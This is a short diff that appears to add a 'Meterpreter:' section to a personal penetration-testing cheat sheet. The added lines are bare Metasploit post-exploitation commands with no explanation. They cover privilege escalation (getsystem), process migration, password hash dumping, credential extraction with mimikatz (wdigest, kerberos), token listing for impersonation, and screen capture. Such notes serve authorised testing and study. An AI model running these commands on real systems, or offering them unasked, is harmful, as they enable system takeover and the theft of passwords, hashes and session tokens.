@@ -13,3 +13,16 @@ services
 creds
 loot
 
+Meterpreter:
+
+getsystem
+run migrate -f
+run post\/windows\/gather\/smart_hashdump
+load mimikatz
+wdigest
+kerberos
+load incognito
+list_tokens -g
+run post/windows/gather/screen_spy
+
+
